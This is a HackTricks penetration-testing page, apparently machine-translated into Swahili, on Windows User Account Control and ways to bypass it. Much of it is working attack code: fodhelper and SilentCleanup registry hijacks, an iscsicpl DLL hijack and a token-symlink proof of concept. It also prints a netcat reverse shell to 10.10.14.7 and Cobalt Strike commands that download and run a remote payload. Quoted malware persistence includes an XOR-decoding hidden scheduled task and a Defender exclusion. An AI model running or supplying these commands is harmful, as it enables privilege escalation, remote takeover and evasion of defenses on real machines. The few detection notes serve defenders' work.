# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **ombi la idhini kwa shughuli zilizoinuliwa**. Applications zina viwango tofauti vya `integrity`, na program yenye **kiwango cha juu** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. UAC inapowezeshwa, applications na tasks huendeshwa kila mara **chini ya muktadha wa usalama wa account isiyo ya administrator** isipokuwa administrator aidhinishe applications/tasks hizo waziwazi ili zipate access ya kiwango cha administrator kwenye mfumo na kuendeshwa. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa security boundary.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapokuwepo, mtumiaji wa administrator hupewa tokens 2: token ya mtumiaji wa kawaida, ya kutekeleza vitendo vya kawaida kwa integrity ya kati, na nyingine yenye privileges za admin.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inaeleza kwa kina jinsi UAC inavyofanya kazi na inajumuisha mchakato wa logon, matumizi ya mtumiaji, na usanifu wa UAC.<sup>[[2]](#references)</sup> Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kusanidi na kusambaza mipangilio hiyo kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali imejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**local security policies** ("secpol.msc" kwenye mifumo mingi) husanidiwa kwa default ili **kuwazuia users wasio-admin kufanya installations za software**. Hii inamaanisha kwamba hata kama user asiye-admin anaweza kupakua installer ya software yako, hataweza kuiendesha bila account ya admin.

### Registry Keys to Force UAC to Ask for Elevation

Ukiwa standard user asiye na rights za admin, unaweza kuhakikisha kuwa account ya "standard" **inaombwa credentials na UAC** inapojaribu kufanya vitendo fulani. Kitendo hiki kitahitaji kurekebisha **registry keys** fulani, ambazo zinahitaji permissions za admin, isipokuwa kuwe na **UAC bypass**, au attacker awe tayari amelogin akiwa admin.

Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za account yake** ili kufanya vitendo vya kiutawala.

**Katika matumizi halisi, hii ni muhimu tu ikiwa tayari una token iliyoinuliwa, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo, registry write yenyewe huzuiwa.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na default values kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, operations za kiutawala humtaka user aingize tena credentials zake.

### Note

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye accounts zao na kupata rights za administrator bila local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity ili kuzuia michakato yenye high-integrity-level (kama web browsers) kufikia data yenye low-integrity-level (kama temporary Internet files folder). Hili hufanywa kwa kuendesha browser kwa kutumia low-integrity token. Browser inapojaribu kufikia data iliyohifadhiwa katika low-integrity zone, operating system hukagua integrity level ya process na kuruhusu access kulingana nayo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata access kwa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token yenye orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kum-authenticate mtumiaji kwenye computer na kwenye resources za network.

### Autoadminlogon

Ili kusanidi Windows ijiingize moja kwa moja kwa mtumiaji mahususi wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye secure systems pekee, kwa kuwa hufichua password kwenye registry.

Weka keys zifuatazo kwa kutumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya logon, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi sana kwa kuwa unaweza kubofya tu "Yes" UAC prompt inapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kubypass UAC ikiwa iko kwenye security level ya juu zaidi (Always) kuliko ikiwa iko kwenye level nyingine yoyote (Default).**

### Fast triage kutoka kwenye medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko katika scenario sahihi na linganisha host build na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Vidokezo vya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindwa: UACME bado inafuatilia baadhi ya mbinu za `AlwaysNotify compatible` kwenye Windows builds za kisasa.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**), unaweza **kutekeleza reverse shell yenye admin privileges** (high integrity level) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** UAC "bypass" (ufikiaji kamili wa mfumo wa faili)

Ikiwa una shell yenye mtumiaji aliye ndani ya kundi la Administrators, unaweza **ku-mount C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) locally kama diski mpya, na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana kama hila hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

COM objects zinazoji-elevate zenyewe bado ni sehemu ya vitendo ya UAC kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye branches za sasa za Windows, na offensive tooling inaendelea kurekebisha `CMSTPLUA` kwa kuchanganya process ya interactive desktop, execution ya 64-bit, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya vitendo:
- Pendelea process ya **64-bit** katika **interactive session** ya mtumiaji (kwa kawaida `explorer.exe` au child yake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwenye BOF / UACME implementation badala ya wrapper rahisi ya `CreateProcess`.
- Tarajia child execution kutokea katika **separate elevated process**; BOF nyingi hazi-elevate beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool zinapatikana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa UAC bypass exploits kadhaa. Kumbuka kwamba utahitaji **ku-compile UACME kwa kutumia visual studio au msbuild**. Compilation itaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unayohitaji.**<sup>[[3]](#references)</sup>\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zita-**prompt** programs nyingine ambazo zitam-**alert** **mtumiaji** kwamba kuna kitu kinafanyika.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history) unapata Windows release `1607` kutoka kwenye build versions.

Workflow ya vitendo ni kwanza **kutathmini host build**, kisha kutumia method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` hulinganisha kwa haraka build ya ndani na mbinu zake za UAC zinazojulikana, jambo linalosaidia kuondoa haraka PoC zisizofanya kazi.<sup>[[4]](#references)</sup>
- `UACME` bado ni catalogue bora ya umma ya kuhusisha bypass na build mahususi. Matoleo ya hivi karibuni yaliongeza mbinu mpya na kujaribu tena zilizokuwapo dhidi ya **Windows 11 25H2**, kwa hivyo kagua tena README/release notes kabla ya kudhani kuwa blog post ya zamani bado inatumika bila mabadiliko.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hupewa auto-elevated kwenye Windows za kisasa. Inapozinduliwa, huuliza njia ya Registry ya kila mtumiaji iliyo hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo huruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuzindua mchakato wa High Integrity bila UAC prompt.

Registry path inayoulizwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha ianzishe)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Hufanya kazi wakati mtumiaji wa sasa ni mshiriki wa Administrators na kiwango cha UAC ni default/lenient (si Always Notify yenye restrictions za ziada).
- Tumia path ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au path ya EXE). Epuka UIs zinazotoa prompts kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU only)

Samples za hivi karibuni zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya `ms-settings` ProgID** kupitia value ya `CurVer` ya kila mtumiaji. Binary inayoinuliwa kiotomatiki bado hutafuta handler chini ya `HKCU`, kwa hiyo token ya admin haihitajiki kuweka keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata elevated privileges, malware kwa kawaida **huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na huunda upya persistence ili kuendeshwa kama high integrity. Task ya persistence ya kawaida huhifadhi **XOR-encrypted PowerShell script** kwenye diski na kuidecode/kuitekeleza in-memory kila saa:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Toleo hili bado husafisha dropper na kuacha tu staged payloads, hivyo detection hutegemea ufuatiliaji wa **`CurVer` hijack**, ubadilishaji wa `ConsentPromptBehaviorAdmin`, uundaji wa Defender exclusion, au scheduled tasks zinazofanya in-memory decrypt ya PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` kwa marupendeleo ya juu zaidi na kupanua `%windir%` kutoka kwenye mazingira ya mtumiaji. Ikiwa unadhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye amri yoyote na kupata high integrity bila consent dialog.<sup>[[8]](#references)</sup> Njia hii bado inafaa kujaribiwa kwenye builds za hivi karibuni kwa sababu UACME inaendelea kuweka technique hii ikiwa active, na issue tracking ya hivi karibuni inaonyesha kuwa Windows 11 24H2 huenda ikahitaji marekebisho madogo tu ya quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ikiwa task inanakili path kwenye build hiyo, jaribu tena kwa payload inayoishia kwa quote (kwa mfano `cmd.exe"`). Daima safisha `HKCU\Environment\windir` baada ya kufanya testing.

#### UAC bypass zaidi

UAC bypass nyingi za kawaida zinazotumia UI flows, COM objects, au desktop interaction zinahitaji **interactive session kamili** na victim; shell ya kawaida ya `nc.exe` au service inayoendesha katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hili ukitumia session ya **meterpreter**. Migrate hadi kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye custom extension (.thm) na uhusishe extension hiyo na payload yetu - More UAC bypass: Unaweza kupata hii ukitumia meterpreter session. Migrate hadi kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass yenye GUI

Ikiwa una access ya **GUI**, unaweza kukubali tu UAC prompt inapoonekana; kwa hiyo huhitaji bypass ya kiufundi. Hivyo, kupata GUI session mara nyingi hutosha kuondoa kikwazo cha vitendo kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **tools ambazo zitakuwa zinaendesha kama administrator**, na kutoka hapo unaweza **ku-run** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa na **stealth** zaidi.

### UAC bypass ya brute-force yenye kelele

Ikiwa hujali kuwa noisy, unaweza kila mara **ku-run kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba ku-elevate permissions hadi user akubali**.

### Bypass yako mwenyewe - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypass nyingi hutumia DLL hijacking** (mara nyingi kwa kufanya binary iliyoelevate i-load DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba inapotekelezwa ina-run katika high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambako huna writing permissions. Unaweza kubypass hili ukitumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inakuruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii huendeshwa kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kucopy DLL yako ndani ya protected path na ku-execute binary iliyo vulnerable na autoelevated.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** itakayo-**execute** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass kupitia `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary ya **auto-elevated** ambayo inaweza kutumiwa vibaya ku-load `iscsiexe.dll` kulingana na search order. Ikiwa unaweza kuweka `iscsiexe.dll` yenye madhara ndani ya folder inayoweza kuandikwa na **user**, kisha u-modify `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza ku-load attacker DLL ndani ya process ya `iscsicpl.exe` iliyo-elevate **bila kuonyesha UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Notes za practical:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha katika **Medium Integrity** kutokana na UAC.
- Copy ya **SysWOW64** ndiyo muhimu kwa bypass hii. Ichukulie copy ya **System32** kama binary tofauti na u-validate behavior yake kivyake.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hiyo ProcMon workflow ileile inayotumika kwa UAC bypass nyingine ni muhimu ku-validate missing DLL load.

Mtiririko wa chini kabisa:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Weka arifa kuhusu `reg add` / registry writes kwenye `HKCU\Environment\Path` zinazofuatwa mara moja na utekelezaji wa `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tafuta `iscsiexe.dll` katika maeneo **yanayodhibitiwa na mtumiaji** kama `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Linganisha uanzishaji wa `iscsicpl.exe` na michakato ya watoto isiyotarajiwa au upakiaji wa DLL kutoka nje ya saraka za kawaida za Windows.

### Utafiti mpya unaostahili kuchunguzwa kando

Baadhi ya chains za baada ya 2024 hazionekani tena kama classic `HKCU\Software\Classes` registry hijacks. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kutoka kwenye medium integrity hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe`, na baadaye targets kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia mifano mifupi ya payload katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack kupitia per-logon-session DOS device map

Kwa attack surface kamili ya `RAiLaunchAdminProcess` / UIAccess kwenye Windows 11 25H2, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zilizo na per-session `\Sessions\0\DosDevices/<LUID>` maps. Saraka huundwa kwa lazy kupitia `SeGetTokenDeviceMap` wakati wa kwanza wa `\??` resolution. Ikiwa attacker anam impersonate shadow-admin token katika kiwango cha **SecurityIdentification** pekee, saraka huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), na kuruhusu drive-letter links zinazotangulia `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye session yenye privileges ndogo, ita `RAiProcessRunOnce` ili kuzalisha `runonce.exe` ya shadow-admin isiyoonyesha prompt.
2. Duplicate primary token yake kuwa **identification** token na u-im impersonate wakati wa kufungua `\??`, ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya umiliki wa attacker.
3. Unda symlink ya `C:` hapo inayoelekeza kwenye storage inayodhibitiwa na attacker; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, na kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu na launcher ya UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Inatumia AI Kuzalisha PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-Day Exploitation dhidi ya Walengwa wa Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Kupita Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC kwa Kutumia SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
